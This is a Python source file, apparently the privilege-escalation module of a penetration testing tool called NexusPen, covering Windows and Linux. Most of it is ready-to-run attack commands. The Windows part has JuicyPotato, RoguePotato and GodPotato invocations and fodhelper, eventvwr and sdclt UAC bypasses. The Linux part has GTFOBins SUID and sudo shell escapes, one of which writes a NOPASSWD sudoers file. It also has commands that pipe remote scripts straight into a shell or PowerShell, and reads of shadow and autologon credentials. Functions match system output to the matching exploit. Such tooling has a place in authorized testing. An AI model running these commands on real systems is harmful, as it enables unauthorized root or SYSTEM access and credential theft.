#!/usr/bin/env python3
"""
NexusPen - Privilege Escalation Module
=======================================
Windows and Linux privilege escalation checks and exploits.
"""

import subprocess
import re
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class PrivEscVector:
    """Privilege escalation vector."""
    name: str
    description: str
    risk: str  # high, medium, low
    platform: str  # windows, linux, both
    exploit_cmd: Optional[str] = None
    cve: Optional[str] = None


class WindowsPrivEsc:
    """
    Windows privilege escalation techniques.
    """
    
    # Known Windows privilege escalation exploits
    EXPLOITS = {
        'potato_exploits': [
            {
                'name': 'JuicyPotato',
                'requires': 'SeImpersonatePrivilege',
                'cmd': 'JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami > c:\\temp\\output.txt" -t *',
                'windows': ['7', '8', '2008', '2012', '2016']
            },
            {
                'name': 'PrintSpoofer',
                'requires': 'SeImpersonatePrivilege',
                'cmd': 'PrintSpoofer.exe -i -c cmd',
                'windows': ['10', '2016', '2019']
            },
            {
                'name': 'RoguePotato',
                'requires': 'SeImpersonatePrivilege',
                'cmd': 'RoguePotato.exe -r YOUR_IP -e "cmd.exe" -l 9999',
                'windows': ['10', '2016', '2019']
            },
            {
                'name': 'GodPotato',
                'requires': 'SeImpersonatePrivilege',
                'cmd': 'GodPotato.exe -cmd "cmd /c whoami"',
                'windows': ['all']
            },
        ],
        'uac_bypass': [
            {
                'name': 'fodhelper',
                'cmd': 'REG ADD HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "cmd.exe" /f && fodhelper.exe',
            },
            {
                'name': 'eventvwr',
                'cmd': 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "cmd.exe" /f && eventvwr.exe',
            },
            {
                'name': 'sdclt',
                'cmd': 'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" /d "cmd.exe" /f && sdclt.exe /kickoffelev',
            },
        ],
        'kernel_exploits': [
            {'cve': 'CVE-2021-1732', 'name': 'Win32k LPE', 'windows': ['10', '2016', '2019']},
            {'cve': 'CVE-2021-36934', 'name': 'HiveNightmare/SeriousSAM', 'windows': ['10']},
            {'cve': 'CVE-2021-34527', 'name': 'PrintNightmare', 'windows': ['all']},
            {'cve': 'CVE-2020-0787', 'name': 'BITS Arbitrary File Move', 'windows': ['10']},
            {'cve': 'CVE-2019-1388', 'name': 'Certificate Dialog Elevation', 'windows': ['7', '8', '2008', '2012']},
        ],
    }
    
    @staticmethod
    def check_privileges() -> str:
        """Return command to check current privileges."""
        return "whoami /priv"
    
    @staticmethod
    def check_group_membership() -> str:
        """Return command to check group membership."""
        return "whoami /groups"
    
    @staticmethod
    def find_unquoted_service_paths() -> str:
        """Return command to find unquoted service paths."""
        return 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v "\""'
    
    @staticmethod
    def find_modifiable_services() -> str:
        """Return PowerShell command to find modifiable services."""
        return '''Get-WmiObject win32_service | Select-Object Name,PathName,StartName | Where-Object {$_.PathName -notlike "C:\\Windows\\*"}'''
    
    @staticmethod
    def check_always_install_elevated() -> str:
        """Check AlwaysInstallElevated registry keys."""
        return """
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
"""
    
    @staticmethod
    def check_autologon() -> str:
        """Check for stored autologon credentials."""
        return 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul'
    
    @staticmethod
    def check_scheduled_tasks() -> str:
        """Enumerate scheduled tasks."""
        return "schtasks /query /fo LIST /v"
    
    @staticmethod
    def check_installed_patches() -> str:
        """Check installed patches (for kernel exploits)."""
        return "wmic qfe get Caption,Description,HotFixID,InstalledOn"
    
    @staticmethod
    def run_winpeas() -> str:
        """Return WinPEAS execution command."""
        return ".\\winPEASany.exe quiet"
    
    @staticmethod
    def run_powerup() -> str:
        """Return PowerUp execution command."""
        return "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks\""
    
    @staticmethod
    def generate_enum_script() -> str:
        """Generate Windows enumeration script."""
        return """
@echo off
echo === Windows Privilege Escalation Enumeration ===

echo. 
echo [+] Current User
whoami
whoami /priv
whoami /groups

echo.
echo [+] System Info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

echo.
echo [+] Installed Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB"

echo.
echo [+] Scheduled Tasks
schtasks /query /fo LIST 2>nul | findstr TaskName

echo.
echo [+] Services with Unquoted Paths
wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v \"\\"\"

echo.
echo [+] AlwaysInstallElevated Check
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul

echo.
echo [+] Stored Credentials
cmdkey /list

echo.
echo [+] Autologon Credentials
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul

echo.
echo [+] Running Processes
tasklist /v
"""


class LinuxPrivEsc:
    """
    Linux privilege escalation techniques.
    """
    
    # Known Linux privilege escalation exploits
    EXPLOITS = {
        'kernel': [
            {'cve': 'CVE-2022-0847', 'name': 'DirtyPipe', 'kernels': ['5.8-5.16']},
            {'cve': 'CVE-2021-4034', 'name': 'PwnKit (Polkit)', 'universal': True},
            {'cve': 'CVE-2021-3156', 'name': 'Baron Samedit (Sudo)', 'sudo': '1.8.2-1.9.5p1'},
            {'cve': 'CVE-2016-5195', 'name': 'DirtyCow', 'kernels': ['2.6.22-4.8']},
            {'cve': 'CVE-2019-14287', 'name': 'Sudo Bypass', 'sudo': '<1.8.28'},
            {'cve': 'CVE-2021-22555', 'name': 'Netfilter Heap Overflow', 'kernels': ['2.6.19-5.12']},
        ],
        'misconfig': [
            {'name': 'SUID binary abuse', 'check': 'find / -perm -4000 -type f 2>/dev/null'},
            {'name': 'Capabilities abuse', 'check': 'getcap -r / 2>/dev/null'},
            {'name': 'Writable /etc/passwd', 'check': 'ls -la /etc/passwd'},
            {'name': 'Sudo NOPASSWD', 'check': 'sudo -l'},
            {'name': 'Cron jobs', 'check': 'cat /etc/crontab; ls -la /etc/cron.*'},
            {'name': 'Docker group', 'check': 'id | grep docker'},
            {'name': 'LXD group', 'check': 'id | grep lxd'},
        ],
    }
    
    # GTFOBins SUID exploits
    GTFOBINS_SUID = {
        'bash': 'bash -p',
        'python': 'python -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
        'python3': 'python3 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
        'php': 'php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
        'find': 'find . -exec /bin/sh -p \\; -quit',
        'vim': 'vim -c \':!/bin/sh\'',
        'less': 'less /etc/passwd\n!/bin/sh',
        'more': 'more /etc/passwd\n!/bin/sh',
        'nmap': 'nmap --interactive\n!sh',
        'perl': 'perl -e "exec \'/bin/sh\';"',
        'ruby': 'ruby -e "exec \'/bin/sh\'"',
        'awk': 'awk "BEGIN {system(\'/bin/sh\')}"',
        'tar': 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
        'zip': 'zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"',
        'env': 'env /bin/sh -p',
        'cp': 'cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p',
        'docker': 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
        'strace': 'strace -o /dev/null /bin/sh -p',
        'ltrace': 'ltrace -b -L /bin/sh -p',
        'taskset': 'taskset 1 /bin/sh -p',
        'setarch': 'setarch $(arch) /bin/sh -p',
    }
    
    # Sudo exploits (sudo -l results)
    SUDO_EXPLOITS = {
        'vim': 'sudo vim -c \':!/bin/bash\'',
        'less': 'sudo less /etc/passwd\n!/bin/bash',
        'more': 'sudo more /etc/passwd\n!/bin/bash',
        'awk': 'sudo awk \'BEGIN {system("/bin/bash")}\'',
        'find': 'sudo find . -exec /bin/bash \\; -quit',
        'nmap': 'sudo nmap --interactive\n!bash',
        'python': 'sudo python -c "import pty;pty.spawn(\'/bin/bash\')"',
        'python3': 'sudo python3 -c "import pty;pty.spawn(\'/bin/bash\')"',
        'perl': 'sudo perl -e "exec \'/bin/bash\';"',
        'ruby': 'sudo ruby -e "exec \'/bin/bash\'"',
        'env': 'sudo env /bin/bash',
        'tar': 'sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash',
        'zip': 'sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"',
        'git': 'sudo git -p help config\n!/bin/bash',
        'ftp': 'sudo ftp\n!/bin/bash',
        'socat': 'sudo socat stdin exec:/bin/bash',
        'tee': 'echo "user ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/pwned',
        'nano': 'sudo nano\n^R^X\nreset; bash 1>&0 2>&0',
        'apache2': 'sudo apache2 -f /etc/shadow',
        'mysql': 'sudo mysql -e "\\! /bin/bash"',
        'journalctl': 'sudo journalctl\n!/bin/bash',
    }
    
    @staticmethod
    def check_suid_binaries() -> str:
        """Find SUID binaries."""
        return "find / -perm -4000 -type f 2>/dev/null"
    
    @staticmethod
    def check_sudo_permissions() -> str:
        """Check sudo permissions."""
        return "sudo -l"
    
    @staticmethod
    def check_capabilities() -> str:
        """Check file capabilities."""
        return "getcap -r / 2>/dev/null"
    
    @staticmethod
    def check_writable_files() -> str:
        """Find world-writable files."""
        return "find / -writable -type f 2>/dev/null | grep -v '/proc'"
    
    @staticmethod
    def check_cron_jobs() -> str:
        """Enumerate cron jobs."""
        return "cat /etc/crontab; ls -la /etc/cron.*; cat /var/spool/cron/crontabs/* 2>/dev/null"
    
    @staticmethod
    def run_linpeas() -> str:
        """Return LinPEAS execution command."""
        return "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    
    @staticmethod
    def run_linux_exploit_suggester() -> str:
        """Return Linux Exploit Suggester command."""
        return "curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash"
    
    @staticmethod
    def suggest_exploit_for_suid(binary: str) -> Optional[str]:
        """Suggest exploit for a SUID binary."""
        binary_name = binary.split('/')[-1]
        return LinuxPrivEsc.GTFOBINS_SUID.get(binary_name)
    
    @staticmethod
    def suggest_exploit_for_sudo(binary: str) -> Optional[str]:
        """Suggest exploit for sudo permission."""
        binary_name = binary.split('/')[-1]
        return LinuxPrivEsc.SUDO_EXPLOITS.get(binary_name)
    
    @staticmethod
    def generate_enum_script() -> str:
        """Generate Linux enumeration script."""
        return """#!/bin/bash
echo "=== Linux Privilege Escalation Enumeration ==="

echo -e "\\n[+] System Info"
uname -a
cat /etc/os-release

echo -e "\\n[+] Current User"
id
sudo -l 2>/dev/null

echo -e "\\n[+] SUID Binaries"
find / -perm -4000 -type f 2>/dev/null

echo -e "\\n[+] SGID Binaries"
find / -perm -2000 -type f 2>/dev/null

echo -e "\\n[+] Capabilities"
getcap -r / 2>/dev/null

echo -e "\\n[+] Writable /etc/passwd?"
ls -la /etc/passwd /etc/shadow

echo -e "\\n[+] Cron Jobs"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null

echo -e "\\n[+] Running Processes"
ps aux | grep -v "\\["

echo -e "\\n[+] Network Info"
netstat -tulpn 2>/dev/null || ss -tulpn

echo -e "\\n[+] Interesting Files"
find /home -name "*.txt" -o -name "*.sh" -o -name "*.conf" 2>/dev/null
find /var/www -name "*.php" -o -name "*.conf" 2>/dev/null

echo -e "\\n[+] Docker/LXD"
docker ps 2>/dev/null
lxc list 2>/dev/null
id | grep -E "docker|lxd"

echo -e "\\n[+] Kernel Version (for exploit search)"
uname -r
"""


class PrivEscSuggester:
    """
    Analyze system and suggest privilege escalation techniques.
    """
    
    def __init__(self, platform: str):
        self.platform = platform  # 'windows' or 'linux'
        self.vectors: List[PrivEscVector] = []
    
    def analyze_windows(self, privileges: str, groups: str, services: str) -> List[PrivEscVector]:
        """Analyze Windows system for privesc vectors."""
        vectors = []
        
        # Check for SeImpersonatePrivilege
        if 'SeImpersonatePrivilege' in privileges:
            vectors.append(PrivEscVector(
                name='Potato Exploits',
                description='SeImpersonatePrivilege available - JuicyPotato/PrintSpoofer/GodPotato',
                risk='high',
                platform='windows',
                exploit_cmd='GodPotato.exe -cmd "cmd /c whoami"'
            ))
        
        # Check for SeBackupPrivilege
        if 'SeBackupPrivilege' in privileges:
            vectors.append(PrivEscVector(
                name='Backup Privilege Abuse',
                description='Can read any file including SAM/SYSTEM',
                risk='high',
                platform='windows',
                exploit_cmd='Copy SAM and SYSTEM hives, then secretsdump.py'
            ))
        
        # Add more checks...
        
        self.vectors = vectors
        return vectors
    
    def analyze_linux(self, suid_list: str, sudo_l: str, caps: str) -> List[PrivEscVector]:
        """Analyze Linux system for privesc vectors."""
        vectors = []
        
        # Check SUID binaries
        for line in suid_list.split('\n'):
            binary = line.strip()
            if binary:
                exploit = LinuxPrivEsc.suggest_exploit_for_suid(binary)
                if exploit:
                    binary_name = binary.split('/')[-1]
                    vectors.append(PrivEscVector(
                        name=f'SUID {binary_name}',
                        description=f'Exploitable SUID binary: {binary}',
                        risk='high',
                        platform='linux',
                        exploit_cmd=exploit
                    ))
        
        # Check sudo permissions
        if sudo_l and 'NOPASSWD' in sudo_l:
            for line in sudo_l.split('\n'):
                for binary, exploit in LinuxPrivEsc.SUDO_EXPLOITS.items():
                    if binary in line:
                        vectors.append(PrivEscVector(
                            name=f'Sudo {binary}',
                            description=f'Sudo NOPASSWD: {binary}',
                            risk='high',
                            platform='linux',
                            exploit_cmd=exploit
                        ))
        
        self.vectors = vectors
        return vectors
    
    def display_vectors(self):
        """Display discovered privilege escalation vectors."""
        if not self.vectors:
            console.print("[yellow]No privilege escalation vectors found[/yellow]")
            return
        
        table = Table(title="Privilege Escalation Vectors", show_header=True,
                     header_style="bold red")
        table.add_column("Name", style="cyan")
        table.add_column("Risk", style="yellow")
        table.add_column("Description", style="white")
        
        for v in self.vectors:
            risk_color = {'high': 'red', 'medium': 'yellow', 'low': 'green'}.get(v.risk, 'white')
            table.add_row(v.name, f"[{risk_color}]{v.risk}[/{risk_color}]", v.description)
        
        console.print(table)
